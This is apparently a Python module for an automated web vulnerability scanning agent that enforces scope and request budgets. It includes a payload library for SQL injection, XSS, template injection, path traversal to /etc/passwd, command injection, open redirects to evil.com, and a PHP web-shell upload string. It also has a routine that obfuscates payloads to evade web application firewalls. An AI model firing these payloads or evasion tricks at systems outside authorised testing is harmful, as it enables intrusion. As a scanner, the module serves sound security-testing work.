"""Web security agent for vulnerability scanning."""

import asyncio
import logging
import os
from typing import Optional
from urllib.parse import urljoin, urlsplit, urlunsplit

import httpx
from secagents.agents.base import BaseAgent, AgentConfig, AgentOutput, AgentRole
from secagents.prompts import WEB_SECURITY_PROMPT
from secagents.infra.execution_budget import BudgetExceeded, ExecutionBudget
from secagents.infra.scope import enforce_scope, ScopeViolationError

logger = logging.getLogger(__name__)


class WebSecurityAgent(BaseAgent):
    """Tests web vulnerabilities: XSS, SQLi, SSRF, LFI, RCE, SSTI, etc.

    Responsibilities:
    - Generate context-aware payloads
    - Test multiple vulnerability types
    - Validate findings with response analysis
    - Record signature matches as manual leads pending typed proof
    """

    # Vulnerability detection signatures - Enhanced with 20+ classes
    VULN_SIGNATURES = {
        "sqli": {
            "patterns": [
                r"SQL syntax error",
                r"mysql_fetch_array",
                r"Warning.*MySQL",
                r"PostgreSQL.*error",
                r"Oracle error",
                r"ODBC.*Driver",
                r"Division by zero",
            ],
            "payloads": [
                "' OR '1'='1",
                "' UNION SELECT NULL--",
                "'; SELECT 1/0--",
                "') OR ('1'='1",
            ],
        },
        "xss": {
            "patterns": [
                r"<img\s+src=x\s+onerror=alert",
                r"<svg.*onload=alert",
                r"<iframe.*src=javascript",
                r"<body.*onload=alert",
                r"alert\(document\.domain\)",
            ],
            "payloads": [
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "<iframe src=javascript:alert(1)>",
                "{{constructor.constructor('alert(1)')()}}",  # Angular injection
            ],
        },
        "ssti": {
            "patterns": [
                r"\{\{.*\}\}",
                r"\$\{.*\}",
                r"\[%.*%\]",
                r"\b49\b",
                r"\b72\b",
                r"7777777",
            ],
            "payloads": [
                "{{7*7}}",
                "${7*7}",
                "[%7*7%]",
                "{{7*'7'}}",
                "<%= 7*7 %>",
            ],
        },
        "lfi": {
            "patterns": [
                r"root:.*:0:0:",
                r"bin/bash",
                r"etc/passwd",
                r"\[extensions\]",
                r"boot\.ini",
            ],
            "payloads": [
                "../../../etc/passwd",
                "....//....//....//etc/passwd",
                "%2e%2e%2fetc%2fpasswd",
                "C:\\Windows\\win.ini",
            ],
        },
        "rce": {
            "patterns": [
                r"uid=",
                r"gid=",
                r"groups=",
                r"command not found",
            ],
            "payloads": [
                "; id #",
                "| whoami",
                "`whoami`",
                "$(whoami)",
            ],
        },
        "open_redirect": {
            "patterns": [
                r"Location: https?://evil\.com",
                r"window\.location\s*=\s*['\"]https?://evil\.com",
            ],
            "payloads": [
                "https://evil.com",
                "//evil.com",
                "/\\evil.com",
                "https://target.com@evil.com",
            ],
        },
        "prototype_pollution": {
            "patterns": [
                r"\"__proto__\":",
                r"\"constructor\":",
            ],
            "payloads": [
                '{"__proto__": {"admin": true}}',
                "?__proto__[isAdmin]=true",
            ],
        },
        "file_upload": {
            "patterns": [
                r"<?php",
                r"GIF89a",
                r"eval\(",
                r"base64_decode",
            ],
            "payloads": [
                "shell.php",
                "shell.php.jpg",
                "shell.pHp",
                "shell.php5",
                "shell.php%00.jpg",
                "shell.jpg.php",
                "GIF89a; <?php system($_GET['cmd']); ?>",  # Magic bytes + PHP
                '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',  # SVG XSS
                "../../../etc/passwd",  # Zip slip / Filename injection
                "shell.phtml",
            ],
        },
    }

    TIME_BASED_PAYLOADS = {
        "sqli": [
            "'; WAITFOR DELAY '0:0:{delay}'--",
            "'; SELECT pg_sleep({delay})--",
            "'; SELECT sleep({delay})--",
        ],
        "rce": [
            "; sleep {delay} #",
            "| sleep {delay}",
            "`sleep {delay}`",
            "$(sleep {delay})",
        ],
        "ssti": [
            '{{{{_self.env.registerUndefinedFilterCallback("sleep")}}}}{{{{_self.env.getFilter("{delay}")}}}}',
        ],
    }

    def __init__(
        self,
        *,
        budget: ExecutionBudget | None = None,
        auth_headers: dict[str, str] | None = None,
    ):
        super().__init__(
            AgentConfig(
                role=AgentRole.WEB_SECURITY,
                name="web_security",
                tools=["http_request", "payload_generate", "response_analyze"],
                timeout_seconds=300.0,
            )
        )
        self.logger = logging.getLogger("secagents.web_security")
        self._client: Optional[httpx.AsyncClient] = None
        self._owns_budget = budget is None
        self.budget = budget or ExecutionBudget(max_requests=100, max_duration_seconds=120)
        self.auth_headers = dict(auth_headers or {})

    def mutate_payload_for_waf(self, payload: str, vuln_type: str) -> list[str]:
        """Generate WAF evasion payload variants via encoding, comment injection, and obfuscation."""
        mutations = [payload]
        import urllib.parse

        # 1. URL double encoding
        mutations.append(urllib.parse.quote(urllib.parse.quote(payload)))

        # 2. SQLi specific comment obfuscation
        if vuln_type == "sqli":
            mutations.append(payload.replace(" ", "/**/"))
            mutations.append(payload.replace("UNION", "UnIoN").replace("SELECT", "SeLeCt"))
            mutations.append(payload.replace("'", "%27"))

        # 3. XSS specific obfuscation
        elif vuln_type == "xss":
            mutations.append(payload.replace("<", "%3C").replace(">", "%3E"))
            mutations.append(payload.replace("alert", "prompt").replace("1", "document.domain"))
            mutations.append(
                f"<svg/onload={payload.replace('<script>', '').replace('</script>', '')}>"
            )

        # 4. Command Injection obfuscation
        elif vuln_type in ("rce", "cmdi"):
            mutations.append(payload.replace("whoami", "w'h'o'a'm'i"))
            mutations.append(payload.replace("whoami", "$({a,w}{b,h}{c,o}{d,a}{e,m}{f,i})"))
            mutations.append(payload.replace(" ", "${IFS}"))

        return list(dict.fromkeys(mutations))

    @property
    def client(self) -> httpx.AsyncClient:
        if self._client is None:
            verify_ssl = os.environ.get("SECAGENT_VERIFY_SSL", "true").lower() != "false"
            self._client = httpx.AsyncClient(
                timeout=10.0,
                follow_redirects=False,
                verify=verify_ssl,
                headers=self.auth_headers,
            )
        return self._client

    def base_system_prompt(self) -> str:
        """Return the web security agent's base system prompt."""
        return WEB_SECURITY_PROMPT

    async def execute(self, task: dict) -> AgentOutput:
        """Execute web vulnerability scanning."""
        target = task.get("target", "")
        endpoints = task.get("endpoints", [])[:20]
        requested_types = task.get("vuln_types", list(self.VULN_SIGNATURES.keys()))[:5]
        unsupported_types = [key for key in requested_types if key not in self.VULN_SIGNATURES]
        vuln_types = [key for key in requested_types if key in self.VULN_SIGNATURES]
        if self._owns_budget:
            self.budget = ExecutionBudget(max_requests=100, max_duration_seconds=120)

        if not endpoints:
            self.logger.error("No endpoints specified")
            return self._format_output(
                result={"error": "endpoints required", "budget": self.budget.snapshot()},
                confidence=0.0,
                reasoning="No endpoints to test",
            )

        self.logger.info(f"Testing {len(endpoints)} endpoints for {len(vuln_types)} vuln types")

        try:
            findings, scoped_count = await self._test_endpoints(endpoints, vuln_types, target)

            confidence = self._calculate_confidence(
                evidence_count=len(findings),
                max_evidence=20,
                base_confidence=0.6,
            )

            result = {
                "findings": findings,
                "endpoints_tested": scoped_count if vuln_types else 0,
                "vuln_types_tested": len(vuln_types),
                "coverage_gaps": [
                    {"vuln_type": key, "reason": "No supported specialist proof probe"}
                    for key in unsupported_types
                ]
                + (
                    [{"reason": "One or more endpoints were outside authorized scope"}]
                    if scoped_count < len(endpoints)
                    else []
                ),
                "total_requests_sent": self.budget.snapshot()["requests_used"],
                "budget": self.budget.snapshot(),
            }

            self.logger.info(f"Found {len(findings)} potential vulnerabilities")

            return self._format_output(
                result=result,
                confidence=confidence,
                reasoning=f"Tested {scoped_count if vuln_types else 0} endpoints for {len(vuln_types)} vuln types",
                metadata={
                    "target": target,
                    "endpoint_count": scoped_count if vuln_types else 0,
                    "vuln_type_count": len(vuln_types),
                },
            )
        except Exception as e:
            self.logger.error(f"Web security scan failed: {str(e)}", exc_info=True)
            return self._format_output(
                result={"error": str(e), "budget": self.budget.snapshot()},
                confidence=0.0,
                reasoning="Scan execution failed",
            )
        finally:
            if self._client:
                await self._client.aclose()
                self._client = None

    async def _test_endpoints(
        self, endpoints: list[str], vuln_types: list[str], target: str
    ) -> tuple[list[dict], int]:
        """Test multiple endpoints for vulnerabilities concurrently."""
        findings = []
        sem = asyncio.Semaphore(10)

        # Resolve the final request URL before validating scope. Absolute inventory
        # URLs must remain absolute; joining them to the target changes the host/path.
        scoped_endpoints = []
        for endpoint in endpoints:
            try:
                url = self._resolve_endpoint(target, endpoint)
                enforce_scope(url)
                scoped_endpoints.append(url)
            except ScopeViolationError:
                self.logger.debug(f"Endpoint {endpoint} filtered by scope policy")
                continue

        if not scoped_endpoints:
            self.logger.warning("No endpoints passed scope validation")
            return [], 0

        async def _test_worker(endpoint: str, vuln_type: str):
            async with sem:
                res = await self._test(endpoint, vuln_type, target)
                if res:
                    findings.append(res)

        tasks = [
            _test_worker(endpoint, vuln_type)
            for endpoint in scoped_endpoints
            for vuln_type in vuln_types
        ]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for result in results:
            if isinstance(result, BudgetExceeded):
                self.logger.info("Web security requests stopped: %s", result)
            elif isinstance(result, Exception):
                self.logger.warning("Web security probe failed: %s", result)
        return findings, len(scoped_endpoints)

    @staticmethod
    def _resolve_endpoint(target: str, endpoint: str) -> str:
        base = target if "://" in target else f"https://{target}"
        parts = urlsplit(base)
        directory = parts.path.rstrip("/") + "/"
        base_url = urlunsplit((parts.scheme, parts.netloc, directory, "", ""))
        return urljoin(base_url, endpoint)

    async def _test(self, endpoint: str, vuln_type: str, target: str) -> Optional[dict]:
        """Test a single endpoint for a vulnerability type."""

        # 1. Content-based testing
        if vuln_type in self.VULN_SIGNATURES:
            sig = self.VULN_SIGNATURES[vuln_type]
            baseline = await self._send_payload(endpoint, "safe_canary_value", target)
            for payload in sig.get("payloads", []):
                if self.budget.snapshot()["termination_reason"]:
                    break
                response = await self._send_payload(endpoint, payload, target)
                if (
                    response
                    and baseline is not None
                    and not self._check_response(baseline, sig.get("patterns", []))
                    and self._check_response(response, sig.get("patterns", []))
                ):
                    return {
                        "type": vuln_type,
                        "endpoint": endpoint,
                        "payload": payload,
                        "validation_status": "manual_lead",
                        "validated": False,
                        "confidence": 0.5,
                        "severity": self._get_severity(vuln_type),
                        "cwe": self._get_cwe(vuln_type),
                        "method": "content-based",
                    }

        # Standalone timing heuristics lack independent controls and typed proof.

        return None

    async def _send_payload(self, endpoint: str, payload: str, target: str) -> Optional[str]:
        """Send actual HTTP request."""
        try:
            url = self._resolve_endpoint(target, endpoint)
            params = {"test": payload, "q": payload}
            async with self.budget.request(url):
                resp = await self.client.get(url, params=params)
            return resp.text
        except httpx.HTTPError as e:
            self.logger.debug(f"Request failed: {str(e)}")
            return None

    def _check_response(self, response: str, patterns: list[str]) -> bool:
        """Check response for vulnerability patterns using native C++ engine when available."""
        from secagents.core.native import native_engine

        for pattern in patterns:
            if native_engine.match_signature(response, pattern):
                return True
        return False

    def _get_severity(self, vuln_type: str) -> str:
        severity_map = {
            "rce": "critical",
            "sqli": "critical",
            "ssti": "critical",
            "lfi": "high",
            "ssrf": "high",
            "xss": "high",
            "prototype_pollution": "high",
            "open_redirect": "medium",
        }
        return severity_map.get(vuln_type, "medium")

    def _get_cwe(self, vuln_type: str) -> str:
        cwe_map = {
            "sqli": "CWE-89",
            "xss": "CWE-79",
            "ssti": "CWE-1336",
            "lfi": "CWE-22",
            "ssrf": "CWE-918",
            "rce": "CWE-78",
            "open_redirect": "CWE-601",
            "prototype_pollution": "CWE-1321",
        }
        return cwe_map.get(vuln_type, "CWE-20")
